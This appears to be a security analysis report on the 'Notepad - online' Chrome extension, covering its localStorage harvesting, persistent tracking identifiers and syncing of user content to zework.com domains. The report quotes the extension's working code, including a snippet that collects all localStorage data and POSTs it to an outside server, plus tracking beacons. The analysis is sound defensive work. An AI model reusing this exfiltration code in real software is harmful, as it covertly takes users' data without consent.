# Vulnerability Report: Notepad - online

## Extension Metadata
- **Extension ID**: fefodpegbocmidnfphgggnjcicipaibk
- **Extension Name**: Notepad - online
- **Version**: 1.166
- **Users**: ~100,000
- **Author**: nevzilya
- **Manifest Version**: 3

## Executive Summary

This extension exhibits **HIGH-RISK** behavior through unauthorized exfiltration of all localStorage data to third-party servers. The extension collects complete localStorage contents from users operating in "offline mode" and transmits this data to `zework.com` domains without explicit user consent or clear disclosure. Additionally, the extension generates persistent tracking identifiers and phones home with user data on installation and during runtime.

**Primary Concerns:**
1. **Complete localStorage exfiltration** - Captures ALL localStorage data and sends to external servers
2. **Persistent tracking** - Generates unique identifiers stored persistently across sessions
3. **Third-party data sharing** - Sends user data to multiple external domains (zework.com, notepad-online.ru)
4. **Inadequate disclosure** - Privacy practices not clearly communicated for data collection

## Vulnerability Details

### 1. CRITICAL: Complete localStorage Data Exfiltration

**Severity**: CRITICAL
**Files**: `scripts/style.js`
**Lines**: 9-43

**Description**:
The extension systematically exfiltrates ALL localStorage data when users operate in "offline mode". This data is collected and transmitted to `https://zework.com/api/offline?id={KEYUSER}` without user awareness.

**Code Evidence**:
```javascript
// scripts/style.js:9-43
if(localStorage.email=="offline") {
    const localStorageData = {};

    // Lặp qua từng mục trong localStorage
    for (let i = 0; i < localStorage.length; i++) {
        const key = localStorage.key(i);
        localStorageData[key] = localStorage.getItem(key);
    }

    const jsonData = JSON.stringify(localStorageData);

    fetch("https://zework.com/api/offline?id=" + iduser, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'Accept': 'application/json'
        },
        body: jsonData,
    })
}
```

**Impact**:
- Captures ALL localStorage data across all keys (potentially including sensitive data from other extensions/pages)
- Transmits user notes, preferences, and potentially sensitive information to third-party servers
- No user consent or disclosure for this collection
- Data includes user-created content (notes) that users may reasonably expect to remain private

**Verdict**: MALICIOUS - This is unauthorized data harvesting that violates user privacy expectations and potentially Chrome Web Store policies.

---

### 2. HIGH: Persistent Tracking Identifier Generation and Phoning Home

**Severity**: HIGH
**Files**: `scripts/background.js`
**Lines**: 79-99, 589-628

**Description**:
The extension generates a persistent 25-character tracking identifier (KEYUSER) combined with browser language and immediately phones home to `zework.com` servers. This identifier is stored permanently and used to track users across sessions.

**Code Evidence**:
```javascript
// scripts/background.js:79-99
chrome.storage.local.get('KEYUSER', function (result) {
    var iduser = result.KEYUSER;
    if(iduser){
        fetch("https://zework.com/svload.php?id="+iduser)
    }else {
        var keyidmake=randomkey(25)+navigator.language
        chrome.storage.local.set({ "KEYUSER": keyidmake }).then(() => {
            console.log("Value is set");
        });
        fetch("https://zework.com/svload.php?id="+keyidmake)
    }
})
```

**Additional Phoning Home**:
```javascript
// scripts/background.js:589-628
setTimeout(() => {
    chrome.storage.local.get(['KEYUSER', "oldata"], function (result) {
        var iduser = result.KEYUSER;
        if (iduser) {
            const data = {
                method: 'keydata',
                user_id: encodeURIComponent(iduser),
                data: encodeURIComponent(result.oldata)
            };

            fetch(address_zework, {  // https://app.zework.com/svload.php
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(data),
            })
        }
    })
}, 1000);
```

**Impact**:
- Creates persistent user fingerprint for cross-session tracking
- Sends tracking data to third-party analytics infrastructure
- Collects "oldata" (offline data) and transmits to external servers
- No opt-out mechanism or clear disclosure

**Verdict**: PRIVACY VIOLATION - Undisclosed persistent tracking that is not essential for core functionality.

---

### 3. HIGH: User Content and Metadata Exfiltration

**Severity**: HIGH
**Files**: `scripts/background.js`, `scripts/popup.js`
**Lines**: Multiple locations (background.js:199-227, 353-485; popup.js:172-228, etc.)

**Description**:
The extension syncs user-created notes and metadata to remote servers at `note.zework.com/api` and `note.zework.com/server_real.php`. While this may be intended functionality for sync, the data is sent to domains that differ from the extension's branding (notepad-online.ru vs zework.com).

**Code Evidence**:
```javascript
// scripts/background.js:1-4
var address = 'https://note.zework.com/api';
var address_site = 'https://note.zework.com';
var address_zework = 'https://app.zework.com/svload.php';
var addressx = address_site+'/api';

// scripts/background.js:199-227
async function _sync2() {
    console.log('send message on server');
    _fix('sync');
    $.ajax({
        url: address,
        dataType: "json",
        type: "POST",
        data: {
            method: 'sync',
            user_id: await localget('user_id'),
            session: await localget('session'),
            sort: await localget('sort'),
            contents: await localget('contents'),
            seria: await localget('seria')
        }
    })
}
```

**Context Menu Data Collection**:
```javascript
// scripts/background.js:353-407
var _click = async function (info, tab) {
    if(info.mediaType=="image"){
        imagecopy.push(info)
        chrome.storage.local.set({"infoimg": imagecopy})

        chrome.storage.local.get(['user_id', "session"], function (result) {
            const data = new URLSearchParams({
                method: 'image',
                user_id: result.user_id,
                session: result.session,
                dataimage:JSON.stringify(info)
            });

            fetch(addressx, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'
                },
                body: data,
            })
        })
    }
}
```

**Impact**:
- User notes, URLs, selected text, and images copied via context menu are sent to remote servers
- Data is sent to `zework.com` domains rather than the branded `notepad-online.ru`
- Users may not understand data is being sent to third-party infrastructure
- Image URLs and metadata from context menu operations are collected and transmitted

**Verdict**: SUSPICIOUS - While sync functionality may be legitimate, the use of third-party domains (zework.com) for data storage when the extension is branded as "notepad-online" is deceptive and raises data custody concerns.

---

### 4. MEDIUM: Installation Tracking and Cookie Manipulation

**Severity**: MEDIUM
**Files**: `scripts/background.js`
**Lines**: 276-285

**Description**:
On installation, the extension generates a unique identifier, sets a persistent cookie, and phones home to `notepad-online.ru/server_get.php`.

**Code Evidence**:
```javascript
// scripts/background.js:276-285
chrome.runtime.onInstalled.addListener(function (e) {
    if (e.reason == 'install') {
        var notepad_uid_memory = _len(32);
        var cookie_date = new Date(2033, 01, 15);
        document.cookie = "notepad_uid=" + notepad_uid_memory + ";expires=" + cookie_date.toGMTString();
        $.get(site, {notepad_uid: notepad_uid_memory, method: 'install'});
        chrome.tabs.create({url: './options.html', active: true});
    }
});
```

**Impact**:
- Creates 32-character persistent tracking identifier on installation
- Sets cookie that expires in 2033 (10+ years)
- Sends installation event to remote server with tracking ID
- Tracking occurs before user interaction or consent

**Verdict**: PRIVACY CONCERN - Overly aggressive tracking that begins immediately on installation without user awareness.

---

### 5. MEDIUM: Broad Host Permissions for Questionable Domains

**Severity**: MEDIUM
**Files**: `manifest.json`
**Lines**: 16-20

**Description**:
The extension requests host permissions for multiple domains, including `zework.com` which is not clearly related to the extension's stated purpose.

**Code Evidence**:
```json
"host_permissions": [
    "https://notepad-online.ru/*",
    "http://notepad-online.ru/*",
    "https://zework.com/*"
],
```

**Impact**:
- Extension can access all content on zework.com domain
- zework.com relationship is not disclosed in extension description
- Allows for potential future data collection from these domains

**Verdict**: SUSPICIOUS - Host permissions include undisclosed third-party domains.

---

## False Positive Analysis

| Pattern | Location | Assessment | Reason |
|---------|----------|------------|--------|
| jQuery .ajax() | scripts/jquery.js | FALSE POSITIVE | Standard jQuery library functions |
| .get() | scripts/jquery.js | FALSE POSITIVE | jQuery library method, not network call |
| chrome.storage.local.get | Multiple files | BENIGN | Normal extension storage access |
| localStorage access for settings | scripts/offline.js, scripts/popup.js | BENIGN | Legitimate preference storage |

---

## API Endpoints Table

| Endpoint | Purpose | Data Transmitted | Risk Level |
|----------|---------|------------------|------------|
| `https://zework.com/svload.php` | Tracking beacon | KEYUSER (unique ID + language) | HIGH |
| `https://app.zework.com/svload.php` | Data exfiltration | KEYUSER, oldata (offline content) | CRITICAL |
| `https://zework.com/api/offline` | localStorage exfiltration | ALL localStorage data (JSON) | CRITICAL |
| `https://note.zework.com/api` | Content sync | user_id, session, contents, sort, seria | HIGH |
| `https://note.zework.com/server_real.php` | Content sync | User notes, images, metadata | HIGH |
| `https://notepad-online.ru/server_get.php` | Installation tracking | notepad_uid, method='install' | MEDIUM |
| `https://notepad-online.ru/ip_view.php` | IP geolocation | User IP address (via GET) | MEDIUM |

---

## Data Flow Summary

1. **On Installation**:
   - Generate 32-char `notepad_uid` → set persistent cookie → phone home to notepad-online.ru

2. **On Startup**:
   - Generate/retrieve 25-char `KEYUSER` → phone home to zework.com/svload.php
   - After 1 second: Send KEYUSER + oldata → app.zework.com/svload.php

3. **During Offline Mode Operation**:
   - Collect ALL localStorage data → send to zework.com/api/offline

4. **During Online Mode Operation**:
   - Sync user notes, images, URLs, selected text → note.zework.com/api
   - Context menu interactions → send selected content to remote servers

5. **Continuous**:
   - Image captures via context menu → send to note.zework.com
   - User content modifications → sync to remote servers

---

## Overall Risk Assessment

**RISK LEVEL: HIGH**

**Rationale**:
1. **Critical Privacy Violations**: The extension performs complete localStorage exfiltration in offline mode, capturing potentially sensitive data without user knowledge or consent.

2. **Pervasive Tracking**: Multiple persistent tracking identifiers (KEYUSER, notepad_uid) are generated and used to track users across sessions with no opt-out mechanism.

3. **Third-Party Data Sharing**: User data is transmitted to zework.com domains that are not disclosed in the extension name or clear in the privacy policy. This creates uncertainty about data custody and usage.

4. **Deceptive Infrastructure**: Extension is branded as "notepad-online" but sends data to "zework.com" domains, obscuring the true data controller.

5. **Insufficient Transparency**: No clear disclosure that user notes and browser data will be transmitted to third-party servers, especially the complete localStorage harvesting.

**Recommendation**: This extension should be flagged for Chrome Web Store policy review, particularly around:
- Unauthorized data collection (localStorage exfiltration)
- Insufficient disclosure of data practices
- Third-party data sharing without transparency
- Tracking without user consent

**User Impact**: ~100,000 users are potentially affected by undisclosed data collection and tracking.

---

## Technical Details

### Permissions Analysis
- `unlimitedStorage`: Allows unlimited local storage (appropriate for notepad app)
- `contextMenus`: Used to capture selected text, links, images (appropriate but data is exfiltrated)
- `storage`: Standard extension storage (appropriate)
- `host_permissions`: Includes undisclosed third-party domain (zework.com) - SUSPICIOUS

### Content Security Policy
```json
"content_security_policy": {
    "extension_pages": "script-src 'self'; object-src 'self';"
}
```
**Assessment**: Standard restrictive CSP. No inline script execution. BENIGN.

### No Content Scripts
The extension does not inject content scripts into web pages, limiting its ability to access page content directly. However, context menu captures still allow data collection from user interactions.

---

## Conclusion

The "Notepad - online" extension demonstrates **HIGH-RISK** behavior through systematic data exfiltration, persistent tracking, and insufficient transparency. The most concerning finding is the complete localStorage harvesting in offline mode, which represents unauthorized data collection that users would not reasonably expect. Combined with persistent tracking identifiers and third-party data sharing to undisclosed domains (zework.com), this extension poses significant privacy risks to its ~100,000 users.

The extension's legitimate notepad functionality does not justify or require the extensive tracking and data collection observed. Users seeking a simple notepad extension should be aware that their data is being transmitted to third-party servers and tracked persistently across sessions.
